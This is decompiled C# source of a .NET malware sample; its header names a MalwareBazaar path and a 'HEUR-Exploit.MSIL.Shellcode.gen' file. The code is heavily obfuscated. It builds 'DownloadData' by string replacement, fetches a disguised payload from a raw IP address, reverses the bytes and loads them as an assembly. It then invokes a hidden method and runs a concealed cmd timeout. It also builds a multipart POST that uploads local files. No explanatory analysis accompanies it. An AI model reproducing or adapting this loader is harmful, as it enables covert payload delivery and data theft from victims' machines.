// Decompiled with JetBrains decompiler
// Type: ProcessorListResolver
// Assembly: Azouu, Version=1.16.3.2988, Culture=neutral, PublicKeyToken=null
// MVID: C6BAE4B9-778D-4E3F-1900-F591882842E0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Exploit.MSIL.Shellcode.gen-076912a40250b0642e4aa604aa87af7b7118bda81c747fa65f3ab07048ae5a10.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

internal sealed class ProcessorListResolver
{
  internal static ProcessorListResolver AwakeGetter;

  public ProcessorListResolver()
  {
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
    int num = 0;
    if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_61b954450f5e4493bc66bf1064dd5c45 == 0)
      num = 0;
    switch (num)
    {
    }
  }

  private static void PrintObserver()
  {
    int num = 2;
    string str1;
    while (true)
    {
      switch (num)
      {
        case 2:
          string str2 = ProcessorListResolver.CloneObserver("https://google.com", Directory.GetFiles(Application.StartupPath), (NameValueCollection) null);
          if (false)
          {
            num = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_83bd05cf00d840999e5e890865fa38c4 == 0 ? 0 : 1;
            continue;
          }
          str1 = str2;
          num = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_2c151baacd0d4993b8d7c020bb6d6d5e != 0 ? 0 : 0;
          continue;
        default:
          goto label_2;
      }
    }
label_2:
    string str3 = str1;
    if (false)
      return;
    Console.WriteLine(str3);
  }

  public static string CloneObserver(string res, string[] cust, NameValueCollection proc)
  {
    int num1 = 19;
    HttpWebRequest httpWebRequest1;
    Stream requestStream;
    Stream stream;
    string str1;
    while (true)
    {
      int index1;
      int index2;
      string format;
      byte[] bytes1;
      bool flag1;
      Assembly assembly;
      string str2;
      byte[] numArray;
      byte[] buffer1;
      AppDomain appDomain;
      string str3;
      Assembly[] assemblies;
      switch (num1)
      {
        case 1:
          if (true)
          {
            httpWebRequest1 = (HttpWebRequest) null;
            goto case 8;
          }
          else
            goto case 8;
        case 2:
          if (proc != null)
          {
            IEnumerator enumerator = proc.Keys.GetEnumerator();
            try
            {
              while (true)
              {
                if (enumerator.MoveNext())
                  goto label_67;
                else
                  goto label_66;
label_64:
                string current;
                int num2;
                switch (num2)
                {
                  case 1:
                    goto label_4;
                  case 2:
                    goto label_67;
                  default:
                    string getter = (string) ProcessorListResolver.CalculateGetter((object) str3, (object) current, (object) proc[current]);
                    byte[] bytes2 = ((Encoding) ProcessorListResolver.PopGetter()).GetBytes(getter);
                    stream.Write(bytes2, 0, bytes2.Length);
                    continue;
                }
label_66:
                num2 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_dbcb3ea9792a4c53ad81747c188d02ac == 0 ? 0 : 1;
                goto label_64;
label_67:
                current = (string) enumerator.Current;
                num2 = 0;
                if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_3a38f49d62e14fbb905a25393014be4d != 0)
                {
                  num2 = 0;
                  goto label_64;
                }
                else
                  goto label_64;
              }
            }
            finally
            {
              if (enumerator is IDisposable disposable)
              {
                int num3 = 0;
                if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_775b16d0230d45bdbae5c29f96d4725f == 0)
                  goto label_74;
label_71:
                switch (num3)
                {
                  default:
                    disposable.Dispose();
                    goto label_75;
                }
label_74:
                num3 = 0;
                goto label_71;
              }
label_75:;
            }
          }
          else
            goto case 23;
        case 3:
          try
          {
            System.Type[] exportedTypes = assembly.GetExportedTypes();
            int num4 = 0;
            if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_3f267bbd53844053bfc244ce55d705d0 != 0)
              num4 = 0;
            while (true)
            {
              int index3;
              MethodInfo[] methods;
              MethodInfo methodInfo;
              bool flag2;
              int index4;
              switch (num4)
              {
                case 1:
                  goto label_82;
                case 2:
                case 6:
                  if (index3 >= methods.Length)
                  {
                    ++index4;
                    break;
                  }
                  goto case 3;
                case 3:
                  methodInfo = methods[index3];
                  try
                  {
                    numArray = ((Encoding) ProcessorListResolver.PatchGetter()).GetBytes("\r\n--" + str2 + "\r\n");
                    buffer1 = ((Encoding) ProcessorListResolver.PatchGetter()).GetBytes("\r\n--" + str2 + "--");
                    int num5 = 0;
                    if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_0b3bf446b4e843bfb4a75aea8451e8f5 == 0)
                      goto label_54;
label_53:
                    switch (num5)
                    {
                      default:
                        goto label_48;
                    }
label_54:
                    num5 = 0;
                    goto label_53;
                  }
                  catch
                  {
                  }
label_48:
                  flag2 = ProcessorListResolver.ConnectGetter((object) methodInfo.Name, (object) "Xknzumossuq");
                  num4 = 7;
                  continue;
                case 4:
                  ++index3;
                  num4 = 2;
                  continue;
                case 5:
                  str1 = (string) methodInfo.Invoke((object) null, (object[]) null);
                  num4 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_0e9806844b4044cfbd2bf83db343b097 != 0 ? 1 : 1;
                  continue;
                case 7:
                  if (flag2)
                  {
                    num4 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_3c1102691ffa4f8894db1eb93325c294 != 0 ? 5 : 0;
                    continue;
                  }
                  goto case 4;
                case 8:
label_50:
                  methods = exportedTypes[index4].GetMethods();
                  index3 = 0;
                  num4 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_4167e4560bd74cd897089f4b8915c7ea != 0 ? 0 : 6;
                  continue;
                default:
                  index4 = 0;
                  break;
              }
              if (index4 < exportedTypes.Length)
                goto label_50;
              else
                break;
            }
          }
          catch
          {
          }
          ++index1;
          num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_83bd05cf00d840999e5e890865fa38c4 != 0 ? 13 : 4;
          continue;
        case 4:
          string s = string.Format(format, (object) "uplTheFile", (object) cust[index2]);
          bytes1 = ((Encoding) ProcessorListResolver.PopGetter()).GetBytes(s);
          num1 = 5;
          continue;
        case 5:
          stream.Write(bytes1, 0, bytes1.Length);
          num1 = 20;
          continue;
        case 6:
label_59:
          // ISSUE: type reference
          // ISSUE: type reference
          // ISSUE: explicit non-virtual call
          appDomain.Load(((IEnumerable<byte>) (byte[]) ProcessorListResolver.GetGetter((object) __nonvirtual (ProcessorListResolver.InvokeGetter(__typeref (WebClient)).GetMethod("DxownxloxadDxatxxax".Replace("x", ""), new System.Type[1]
          {
            ProcessorListResolver.InvokeGetter(__typeref (string))
          })), (object) new WebClient(), (object) new object[1]
          {
            (object) "http://20.51.217.113/imk/Azouu.jpeg"
          })).Reverse<byte>().ToArray<byte>());
          try
          {
            ProcessorListResolver.NewGetter((object) httpWebRequest1, (object) ("multipart/form-data; boundary=" + str2));
            int num6 = 0;
            if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_55d0fd286c184d25851904e4c13a6d53 == 0)
              num6 = 0;
            switch (num6)
            {
              default:
                httpWebRequest1.Method = "POST";
                httpWebRequest1.KeepAlive = true;
                goto label_103;
            }
          }
          catch
          {
            goto case 12;
          }
        case 7:
          index2 = 0;
          break;
        case 8:
          try
          {
            HttpWebRequest httpWebRequest2 = (HttpWebRequest) ProcessorListResolver.CheckGetter((object) res);
            if (true)
            {
              httpWebRequest1 = httpWebRequest2;
              int num7 = 0;
              if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_03a0240ce22a4f698474059e7f0163e5 == 0)
                goto label_23;
label_21:
              switch (num7)
              {
                default:
                  goto label_59;
              }
label_23:
              num7 = 0;
              goto label_21;
            }
            else
              goto case 6;
          }
          catch
          {
            goto case 6;
          }
        case 9:
          stream.Write(buffer1, 0, buffer1.Length);
          num1 = 11;
          continue;
        case 10:
label_3:
          ++index2;
          break;
        case 11:
          httpWebRequest1.ContentLength = ProcessorListResolver.InitGetter((object) stream);
          requestStream = httpWebRequest1.GetRequestStream();
          num1 = 24;
          continue;
        case 12:
label_103:
          MemoryStream memoryStream = new MemoryStream();
          if (false)
          {
            num1 = 26;
            continue;
          }
          stream = (Stream) memoryStream;
          goto case 26;
        case 13:
        case 15:
          if (index1 >= assemblies.Length)
          {
            num1 = 21;
            continue;
          }
          assembly = assemblies[index1];
          num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_0e5cba6f8e214e3ead5c04a791157ef1 != 0 ? 22 : 14;
          continue;
        case 14:
          goto label_105;
        case 16:
          if (flag1)
          {
            num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_179cfc3e22434922a06573071364060b == 0 ? 25 : 27;
            continue;
          }
          goto case 9;
        case 17:
          assemblies = appDomain.GetAssemblies();
          index1 = 0;
          num1 = 15;
          continue;
        case 18:
          try
          {
            if (false)
            {
              int num8 = 0;
              if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_06722e4bb6b344b6850b21b5ad3020d0 == 0)
                num8 = 0;
              switch (num8)
              {
                default:
                  goto label_107;
              }
            }
            else
            {
              ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
              goto default;
            }
          }
          catch
          {
            goto default;
          }
        case 19:
          Observer.PopObserver(Process.GetCurrentProcess().MainWindowHandle, 0);
          num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_e29de8ba8b84442b84a924f54b1975d2 == 0 ? 18 : 12;
          continue;
        case 20:
          using (FileStream fileStream = new FileStream(cust[index2], FileMode.Open, FileAccess.Read))
          {
            byte[] buffer2 = new byte[1024];
            int count = 0;
            int num9 = 1;
            if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_582c387b93b9426b996c5d1213b4704c != 0)
              goto label_87;
label_86:
            bool flag3;
            while (true)
            {
              switch (num9)
              {
                case 1:
                  flag3 = (count = fileStream.Read(buffer2, 0, buffer2.Length)) != 0;
                  num9 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_6349397767f64e08aef63156f1d812ed != 0 ? 0 : 0;
                  continue;
                case 2:
                  stream.Write(buffer2, 0, count);
                  goto case 1;
                default:
                  if (flag3)
                    goto case 2;
                  else
                    goto label_3;
              }
            }
label_87:
            num9 = 1;
            goto label_86;
          }
        case 21:
          str3 = (string) ProcessorListResolver.SearchGetter((object) "\r\n--", (object) str2, (object) "\r\nContent-Disposition: form-data; name=\"{0}\";\r\n\r\n{1}");
          num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_46ef34314b764238a59ea0729e030ea0 == 0 ? 2 : 2;
          continue;
        case 22:
          ProcessStartInfo processStartInfo = new ProcessStartInfo();
          ProcessorListResolver.DestroyGetter((object) processStartInfo, (object) "cmd");
          ProcessorListResolver.QueryGetter((object) processStartInfo, (object) "/C timeout 2");
          processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
          ProcessorListResolver.CountGetter((object) processStartInfo, true);
          ProcessorListResolver.SelectGetter((object) processStartInfo, true);
          ((Process) ProcessorListResolver.ListGetter((object) processStartInfo)).WaitForExit();
          num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_10a7a7cb17654960b723fb79a1488769 != 0 ? 3 : 0;
          continue;
        case 23:
label_4:
          format = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: application/octet-stream\r\n\r\n";
          num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_77c343106eb646efb4eab6a95140c4a8 != 0 ? 7 : 3;
          continue;
        case 24:
          goto label_27;
        case 25:
          goto label_82;
        case 26:
          if (true)
            goto label_118;
label_5:
          if (true)
          {
            buffer1 = (byte[]) null;
            num1 = 17;
            continue;
          }
          goto case 17;
label_118:
          numArray = (byte[]) null;
          goto label_5;
        case 27:
          ProcessorListResolver.ValidateGetter((object) stream, (object) numArray, 0, numArray.Length);
          num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_7958c049c7b8482ab9e8cc31d2fd2c67 != 0 ? 4 : 1;
          continue;
        default:
label_107:
          object obj = ProcessorListResolver.VerifyGetter();
          if (true)
            goto label_112;
label_108:
          DateTime dateTime1 = ProcessorListResolver.RemoveGetter();
          if (true)
            goto label_113;
label_109:
          DateTime dateTime2;
          long ticks = dateTime2.Ticks;
          if (true)
            goto label_114;
label_110:
          long num10;
          string str4 = "----------------------------" + num10.ToString("x");
          if (false)
          {
            num1 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_6349397767f64e08aef63156f1d812ed != 0 ? 1 : 0;
            continue;
          }
          str2 = str4;
          goto case 1;
label_114:
          num10 = ticks;
          goto label_110;
label_113:
          dateTime2 = dateTime1;
          goto label_109;
label_112:
          appDomain = (AppDomain) obj;
          goto label_108;
      }
      flag1 = index2 < cust.Length;
      num1 = 16;
    }
label_27:
    try
    {
      ProcessorListResolver.ExcludeGetter((object) stream, 0L);
      byte[] buffer = new byte[ProcessorListResolver.InitGetter((object) stream)];
      int num11 = 0;
      if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_39d82c311de54dca8ada3a3f69d09946 == 0)
        goto label_30;
label_28:
      while (true)
      {
        switch (num11)
        {
          case 1:
            ProcessorListResolver.PushGetter((object) stream, (object) buffer, 0, buffer.Length);
            ProcessorListResolver.InstantiateGetter((object) stream);
            num11 = \u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_0b3bf446b4e843bfb4a75aea8451e8f5 != 0 ? 0 : 0;
            continue;
          default:
            goto label_31;
        }
      }
label_31:
      requestStream.Write(buffer, 0, buffer.Length);
      goto label_105;
label_30:
      num11 = 1;
      goto label_28;
    }
    finally
    {
      if (requestStream != null)
      {
        int num12 = 0;
        if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_695293b117c24c648975174978b4c5e9 == 0)
          num12 = 0;
        switch (num12)
        {
          default:
            ProcessorListResolver.CloneGetter((object) requestStream);
            break;
        }
      }
    }
label_82:
    return str1;
label_105:
    WebResponse webResponse = (WebResponse) ProcessorListResolver.UpdateGetter((object) httpWebRequest1);
    try
    {
      Stream responseStream = webResponse.GetResponseStream();
      int num13 = 0;
      if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_4610f17fb7844b2995d58ccf8fff9087 == 0)
        num13 = 0;
      switch (num13)
      {
        default:
          str1 = (string) ProcessorListResolver.ComputeGetter((object) new StreamReader(responseStream));
          goto label_82;
      }
    }
    finally
    {
      if (webResponse != null)
      {
        ProcessorListResolver.CloneGetter((object) webResponse);
        int num14 = 0;
        if (\u003CModule\u003E\u007B3bee7a2a\u002D3a89\u002D453f\u002D95de\u002D5ccbf21671f1\u007D.m_183bc0d368f34abc94b5cf7ec80dc406 == 0)
          goto label_17;
label_15:
        switch (num14)
        {
          default:
            goto label_18;
        }
label_17:
        num14 = 0;
        goto label_15;
      }
label_18:;
    }
  }

  internal static bool PrepareGetter() => ProcessorListResolver.AwakeGetter == null;

  internal static ProcessorListResolver StopGetter() => ProcessorListResolver.AwakeGetter;

  internal static object VerifyGetter() => (object) AppDomain.CurrentDomain;

  internal static DateTime RemoveGetter() => DateTime.Now;

  internal static object CheckGetter([In] object obj0) => (object) WebRequest.Create((string) obj0);

  internal static System.Type InvokeGetter([In] RuntimeTypeHandle obj0) => System.Type.GetTypeFromHandle(obj0);

  internal static object GetGetter([In] object obj0, [In] object obj1, [In] object obj2) => ((MethodBase) obj0).Invoke(obj1, (object[]) obj2);

  internal static void NewGetter([In] object obj0, [In] object obj1) => ((WebRequest) obj0).ContentType = (string) obj1;

  internal static void DestroyGetter([In] object obj0, [In] object obj1) => ((ProcessStartInfo) obj0).FileName = (string) obj1;

  internal static void QueryGetter([In] object obj0, [In] object obj1) => ((ProcessStartInfo) obj0).Arguments = (string) obj1;

  internal static void CountGetter([In] object obj0, [In] bool obj1) => ((ProcessStartInfo) obj0).CreateNoWindow = obj1;

  internal static void SelectGetter([In] object obj0, [In] bool obj1) => ((ProcessStartInfo) obj0).UseShellExecute = obj1;

  internal static object ListGetter([In] object obj0) => (object) Process.Start((ProcessStartInfo) obj0);

  internal static object PatchGetter() => (object) Encoding.ASCII;

  internal static bool ConnectGetter([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

  internal static object SearchGetter([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

  internal static object CalculateGetter([In] object obj0, [In] object obj1, [In] object obj2) => (object) string.Format((string) obj0, obj1, obj2);

  internal static object PopGetter() => (object) Encoding.UTF8;

  internal static void ValidateGetter([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => ((Stream) obj0).Write((byte[]) obj1, obj2, obj3);

  internal static long InitGetter([In] object obj0) => ((Stream) obj0).Length;

  internal static void ExcludeGetter([In] object obj0, [In] long obj1) => ((Stream) obj0).Position = obj1;

  internal static int PushGetter([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => ((Stream) obj0).Read((byte[]) obj1, obj2, obj3);

  internal static void InstantiateGetter([In] object obj0) => ((Stream) obj0).Close();

  internal static void CloneGetter([In] object obj0) => ((IDisposable) obj0).Dispose();

  internal static object UpdateGetter([In] object obj0) => (object) ((WebRequest) obj0).GetResponse();

  internal static object ComputeGetter([In] object obj0) => (object) ((TextReader) obj0).ReadToEnd();
}
